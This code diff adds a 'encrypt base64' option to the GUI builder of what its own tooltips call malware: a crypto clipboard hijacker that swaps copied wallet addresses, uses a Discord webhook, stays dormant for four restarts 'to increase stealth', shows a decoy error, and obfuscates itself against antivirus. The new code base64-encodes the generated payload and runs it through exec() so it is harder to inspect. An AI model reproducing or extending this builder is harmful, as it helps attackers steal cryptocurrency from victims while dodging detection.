@@ -14,6 +14,7 @@ import CTkToolTip
 import threading
 import requests
 import shutil
+import base64
 import time
 import hPyT
 import sys
@@ -292,8 +293,26 @@ class build:
             else:
                 new_file_name = out_name.get().strip().replace(" ", "")
                 with open(os.path.join("output", new_file_name), "w") as new_file:
-                    new_file.write(script_content)  
+                    new_file.write(script_content)
+
+        if encrypt_base64_checkbox.get() == "on":
+            def get_imports(script_content):
+                lines = script_content.split('\n')
+                import_lines = [line for line in lines if line.startswith('import ')]
+                return '\n'.join(import_lines)
+            def remove_imports(script_content):
+                lines = script_content.split('\n')
+                filtered_lines = [line for line in lines if not line.startswith('import ')]
+                return '\n'.join(filtered_lines)
+
+            with open(os.path.join("output", new_file_name), "r") as file:
+                script_content = file.read()
+                import_lines = get_imports(script_content)
+                script_content_without_imports = remove_imports(script_content)
                 
+            with open(os.path.join("output", new_file_name), "w") as file:
+                encoded_content = base64.b64encode(script_content_without_imports.encode()).decode()
+                file.write(f"#uses base64 - to decrypt search base64 decoder\n\n{import_lines}\nimport base64\n\nexec(base64.b64decode('{encoded_content}').decode())")
 
         if obfuscate == "on":
             current_path = os.path.join("output", new_file_name)
@@ -540,11 +559,13 @@ class buildgui:
         exe_file_checkbox.pack(pady=5, anchor="w", padx=(12, 0))
 
         """going to just use global here on"""
-        global incubate_checkbox, false_error_checkbox
+        global incubate_checkbox, false_error_checkbox, encrypt_base64_checkbox
         incubate_checkbox = customtkinter.CTkCheckBox(master=config_scroll_frame, text="incubate (4 restarts)", onvalue="on", offvalue="off")
         incubate_checkbox.pack(pady=0, anchor="w", padx=(12, 0))
         false_error_checkbox = customtkinter.CTkCheckBox(master=config_scroll_frame, text="false error", onvalue="on", offvalue="off")
         false_error_checkbox.pack(pady=5, anchor="w", padx=(12, 0))
+        encrypt_base64_checkbox = customtkinter.CTkCheckBox(master=config_scroll_frame, text="encrypt base64", onvalue="on", offvalue="off")
+        encrypt_base64_checkbox.pack(pady=0, anchor="w", padx=(12, 0))
 
         CTkToolTip.CTkToolTip(widget=single_use_checkbox, message="single use: code will run at startup until it detects a address to replace, when this happens the code will never run again - essentially only ever clipping once", wraplength=300)
         CTkToolTip.CTkToolTip(widget=obfuscate_checkbox, message="obfuscate: will run obfucscation and make .exe to make it more difficult to read and more difficult for anti virus detections", wraplength=300)
@@ -558,7 +579,8 @@ class buildgui:
         CTkToolTip.CTkToolTip(widget=check_valid_btn, message="check valid: checks validity of crypto addresses and discord webhook", wraplength=300)
         CTkToolTip.CTkToolTip(widget=incubate_checkbox, message="incubate: if enabled the code will not run until the computer is restarted 4 times, increases stealth, IF INCUBATE IS ENABLED FALSE ERROR WILL NEVER COME UP", wraplength=300)
         CTkToolTip.CTkToolTip(widget=false_error_checkbox, message="false error: if enabled the code will throw a false error to make it look like the code has crashed when it really is just a decoy (wont be installed in the peristant file). IF INCUBATE IS ENABLED FALSE ERROR WILL NEVER COME UP", wraplength=300)
-        
+        CTkToolTip.CTkToolTip(widget=encrypt_base64_checkbox, message="encrypt base64: if enabled the malware src code will be encrypted with base64 and executed with exec(). This works with both normal exe or obfuscated exe", wraplength=300)
+
     def main():
         global option_frame, main_frame, root
 
@@ -632,3 +654,5 @@ if __name__ == "__main__":
         else:
             os.mkdir("output\\dist_non_obfuscated")
         buildgui.main()
+    else:
+        messagebox.showerror(title="error", message="this program only works on windows")
